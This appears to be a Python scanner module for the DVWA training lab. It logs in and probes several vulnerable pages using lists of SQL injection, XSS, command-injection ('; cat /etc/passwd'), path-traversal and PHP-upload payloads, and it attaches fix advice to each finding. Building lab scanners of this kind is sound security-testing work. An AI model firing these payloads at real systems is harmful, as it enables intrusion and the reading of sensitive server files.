"""
DVWA靶场数据对接模块
用于连接真实的DVWA(Damn Vulnerable Web Application)靶场，获取漏洞扫描数据
"""

import requests
import re
import json
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from datetime import datetime
import hashlib


@dataclass
class VulnerabilityInfo:
    vuln_id: str
    vuln_type: str
    vuln_name: str
    path: str
    payload: str
    severity: str
    description: str
    solution: str
    verified: bool = False
    discovered_time: str = ""
    request_data: str = ""
    response_data: str = ""


class DVWAConnector:
    def __init__(self, target_url: str, username: str = "admin", password: str = "password"):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.token = None
        self.security_level = "low"
        self.authenticated = False
        
    def login(self) -> bool:
        try:
            login_page = self.session.get(f"{self.target_url}/login.php")
            token_match = re.search(r"name='user_token'\s+value='([^']+)'", login_page.text)
            
            if token_match:
                self.token = token_match.group(1)
            else:
                self.token = ""
            
            login_data = {
                'username': self.username,
                'password': self.password,
                'Login': 'Login',
                'user_token': self.token
            }
            
            response = self.session.post(
                f"{self.target_url}/login.php",
                data=login_data,
                allow_redirects=True
            )
            
            if 'index.php' in response.url or 'Welcome' in response.text:
                self.authenticated = True
                return True
            return False
            
        except Exception as e:
            print(f"Login failed: {str(e)}")
            return False
    
    def set_security_level(self, level: str = "low"):
        self.security_level = level
        try:
            self.session.get(
                f"{self.target_url}/security.php",
                params={'security': level}
            )
        except Exception as e:
            print(f"Failed to set security level: {str(e)}")
    
    def scan_sqli(self) -> List[VulnerabilityInfo]:
        vulnerabilities = []
        
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "1' ORDER BY 1--",
            "1' UNION SELECT 1,2--",
            "1' UNION SELECT user(),database()--",
            "1' AND SLEEP(5)--"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/vulnerabilities/sqli/",
                    params={'id': payload, 'Submit': 'Submit'}
                )
                
                if 'User ID exists' in response.text or 'First name' in response.text:
                    vuln_id = self._generate_vuln_id('sqli', payload)
                    vulnerabilities.append(VulnerabilityInfo(
                        vuln_id=vuln_id,
                        vuln_type='sql',
                        vuln_name='SQL注入漏洞',
                        path='/vulnerabilities/sqli/',
                        payload=payload,
                        severity='critical',
                        description=f'在ID参数处检测到SQL注入漏洞，Payload: {payload}。攻击者可通过此漏洞获取数据库敏感信息。',
                        solution='使用参数化查询或预编译语句，对用户输入进行严格过滤和转义。',
                        verified=True,
                        discovered_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        request_data=f"GET /vulnerabilities/sqli/?id={payload}&Submit=Submit",
                        response_data=response.text[:500]
                    ))
                    break
                    
            except Exception as e:
                print(f"SQL injection scan error: {str(e)}")
        
        return vulnerabilities
    
    def scan_xss_reflected(self) -> List[VulnerabilityInfo]:
        vulnerabilities = []
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/vulnerabilities/xss_r/",
                    params={'name': payload}
                )
                
                if payload in response.text or 'alert' in response.text:
                    vuln_id = self._generate_vuln_id('xss_r', payload)
                    vulnerabilities.append(VulnerabilityInfo(
                        vuln_id=vuln_id,
                        vuln_type='xss',
                        vuln_name='反射型XSS漏洞',
                        path='/vulnerabilities/xss_r/',
                        payload=payload,
                        severity='high',
                        description=f'在name参数处检测到反射型XSS漏洞。攻击者可注入恶意脚本窃取用户Cookie或执行恶意操作。',
                        solution='对用户输入进行HTML实体编码，设置HttpOnly Cookie属性，使用CSP策略。',
                        verified=True,
                        discovered_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        request_data=f"GET /vulnerabilities/xss_r/?name={payload}",
                        response_data=response.text[:500]
                    ))
                    break
                    
            except Exception as e:
                print(f"XSS reflected scan error: {str(e)}")
        
        return vulnerabilities
    
    def scan_xss_stored(self) -> List[VulnerabilityInfo]:
        vulnerabilities = []
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
        ]
        
        for payload in payloads:
            try:
                self.session.get(f"{self.target_url}/vulnerabilities/xss_s/")
                
                response = self.session.post(
                    f"{self.target_url}/vulnerabilities/xss_s/",
                    data={
                        'txtName': 'Test',
                        'mtxMessage': payload,
                        'btnSign': 'Sign Guestbook'
                    }
                )
                
                if payload in response.text:
                    vuln_id = self._generate_vuln_id('xss_s', payload)
                    vulnerabilities.append(VulnerabilityInfo(
                        vuln_id=vuln_id,
                        vuln_type='xss',
                        vuln_name='存储型XSS漏洞',
                        path='/vulnerabilities/xss_s/',
                        payload=payload,
                        severity='high',
                        description='在留言板功能处检测到存储型XSS漏洞。恶意脚本会被持久化存储，影响所有访问用户。',
                        solution='对用户输入进行HTML实体编码，使用CSP策略限制脚本执行。',
                        verified=True,
                        discovered_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    ))
                    break
                    
            except Exception as e:
                print(f"XSS stored scan error: {str(e)}")
        
        return vulnerabilities
    
    def scan_csrf(self) -> List[VulnerabilityInfo]:
        vulnerabilities = []
        
        try:
            response = self.session.get(f"{self.target_url}/vulnerabilities/csrf/")
            
            if 'password_new' in response.text and 'password_conf' in response.text:
                form_html = response.text
                
                if 'token' not in form_html.lower() and 'csrf' not in form_html.lower():
                    vuln_id = self._generate_vuln_id('csrf', 'password_change')
                    vulnerabilities.append(VulnerabilityInfo(
                        vuln_id=vuln_id,
                        vuln_type='csrf',
                        vuln_name='CSRF跨站请求伪造漏洞',
                        path='/vulnerabilities/csrf/',
                        payload='可构造恶意表单修改用户密码',
                        severity='medium',
                        description='密码修改功能缺少CSRF防护Token。攻击者可诱导用户点击恶意链接修改密码。',
                        solution='添加Anti-CSRF Token验证，验证HTTP Referer头。',
                        verified=True,
                        discovered_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    ))
                    
        except Exception as e:
            print(f"CSRF scan error: {str(e)}")
        
        return vulnerabilities
    
    def scan_command_injection(self) -> List[VulnerabilityInfo]:
        vulnerabilities = []
        
        payloads = [
            '127.0.0.1; cat /etc/passwd',
            '127.0.0.1 && cat /etc/passwd',
            '127.0.0.1 | cat /etc/passwd',
            '127.0.0.1 `cat /etc/passwd`',
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/vulnerabilities/exec/",
                    params={'ip': payload, 'Submit': 'Submit'}
                )
                
                if 'root:' in response.text or 'passwd' in response.text:
                    vuln_id = self._generate_vuln_id('cmdi', payload)
                    vulnerabilities.append(VulnerabilityInfo(
                        vuln_id=vuln_id,
                        vuln_type='cmdi',
                        vuln_name='命令注入漏洞',
                        path='/vulnerabilities/exec/',
                        payload=payload,
                        severity='critical',
                        description='在Ping功能处检测到操作系统命令注入漏洞。攻击者可执行任意系统命令。',
                        solution='禁用危险函数，使用白名单过滤用户输入，使用escapeshellarg()等函数转义。',
                        verified=True,
                        discovered_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        response_data=response.text[:500]
                    ))
                    break
                    
            except Exception as e:
                print(f"Command injection scan error: {str(e)}")
        
        return vulnerabilities
    
    def scan_file_upload(self) -> List[VulnerabilityInfo]:
        vulnerabilities = []
        
        try:
            php_content = b'<?php echo "VULN_TEST_SUCCESS"; ?>'
            
            files = {
                'uploaded': ('test.php', php_content, 'application/x-php')
            }
            
            response = self.session.post(
                f"{self.target_url}/vulnerabilities/upload/",
                files=files,
                data={'Upload': 'Upload'}
            )
            
            if 'successfully uploaded' in response.text or 'test.php' in response.text:
                vuln_id = self._generate_vuln_id('fileupload', 'php_upload')
                vulnerabilities.append(VulnerabilityInfo(
                    vuln_id=vuln_id,
                    vuln_type='fileupload',
                    vuln_name='任意文件上传漏洞',
                    path='/vulnerabilities/upload/',
                    payload='可上传PHP WebShell获取服务器权限',
                    severity='high',
                    description='文件上传功能未对文件类型进行严格校验，可上传恶意脚本文件获取服务器权限。',
                    solution='验证文件MIME类型和扩展名，限制上传目录权限，重命名上传文件。',
                    verified=True,
                    discovered_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                ))
                
        except Exception as e:
            print(f"File upload scan error: {str(e)}")
        
        return vulnerabilities
    
    def scan_lfi(self) -> List[VulnerabilityInfo]:
        vulnerabilities = []
        
        payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            'php://filter/convert.base64-encode/resource=index.php'
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/vulnerabilities/fi/",
                    params={'page': payload}
                )
                
                if 'root:' in response.text or '[extensions]' in response.text:
                    vuln_id = self._generate_vuln_id('lfi', payload)
                    vulnerabilities.append(VulnerabilityInfo(
                        vuln_id=vuln_id,
                        vuln_type='lfi',
                        vuln_name='本地文件包含漏洞',
                        path='/vulnerabilities/fi/',
                        payload=payload,
                        severity='high',
                        description='在page参数处检测到本地文件包含漏洞，可读取服务器敏感文件。',
                        solution='对用户输入进行白名单验证，禁用危险PHP包装器。',
                        verified=True,
                        discovered_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    ))
                    break
                    
            except Exception as e:
                print(f"LFI scan error: {str(e)}")
        
        return vulnerabilities
    
    def full_scan(self) -> Dict[str, Any]:
        if not self.authenticated:
            if not self.login():
                return {
                    'success': False,
                    'error': 'Authentication failed',
                    'vulnerabilities': []
                }
        
        all_vulnerabilities = []
        
        scan_methods = [
            ('SQL注入', self.scan_sqli),
            ('反射型XSS', self.scan_xss_reflected),
            ('存储型XSS', self.scan_xss_stored),
            ('CSRF', self.scan_csrf),
            ('命令注入', self.scan_command_injection),
            ('文件上传', self.scan_file_upload),
            ('本地文件包含', self.scan_lfi)
        ]
        
        for vuln_name, scan_method in scan_methods:
            try:
                vulns = scan_method()
                all_vulnerabilities.extend(vulns)
            except Exception as e:
                print(f"Scan {vuln_name} failed: {str(e)}")
        
        severity_count = {
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0
        }
        
        for vuln in all_vulnerabilities:
            severity_count[vuln.severity] += 1
        
        return {
            'success': True,
            'target': self.target_url,
            'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'security_level': self.security_level,
            'total_vulnerabilities': len(all_vulnerabilities),
            'severity_distribution': severity_count,
            'vulnerabilities': [self._vuln_to_dict(v) for v in all_vulnerabilities]
        }
    
    def _generate_vuln_id(self, vuln_type: str, payload: str) -> str:
        hash_input = f"{vuln_type}_{payload}_{datetime.now().timestamp()}"
        return f"VULN-{hashlib.md5(hash_input.encode()).hexdigest()[:8].upper()}"
    
    def _vuln_to_dict(self, vuln: VulnerabilityInfo) -> Dict:
        return {
            'id': vuln.vuln_id,
            'type': vuln.vuln_type,
            'typeName': self._get_type_name(vuln.vuln_type),
            'name': vuln.vuln_name,
            'path': vuln.path,
            'payload': vuln.payload,
            'severity': vuln.severity,
            'severityName': self._get_severity_name(vuln.severity),
            'description': vuln.description,
            'solution': vuln.solution,
            'verified': vuln.verified,
            'time': vuln.discovered_time
        }
    
    def _get_type_name(self, vuln_type: str) -> str:
        type_names = {
            'sql': 'SQL注入',
            'xss': 'XSS跨站脚本',
            'csrf': 'CSRF跨站请求伪造',
            'cmdi': '命令注入',
            'fileupload': '文件上传',
            'lfi': '本地文件包含',
            'ssrf': 'SSRF服务端请求伪造'
        }
        return type_names.get(vuln_type, vuln_type)
    
    def _get_severity_name(self, severity: str) -> str:
        severity_names = {
            'critical': '严重',
            'high': '高危',
            'medium': '中危',
            'low': '低危'
        }
        return severity_names.get(severity, severity)


if __name__ == '__main__':
    connector = DVWAConnector('http://localhost:8080')
    result = connector.full_scan()
    print(json.dumps(result, indent=2, ensure_ascii=False))
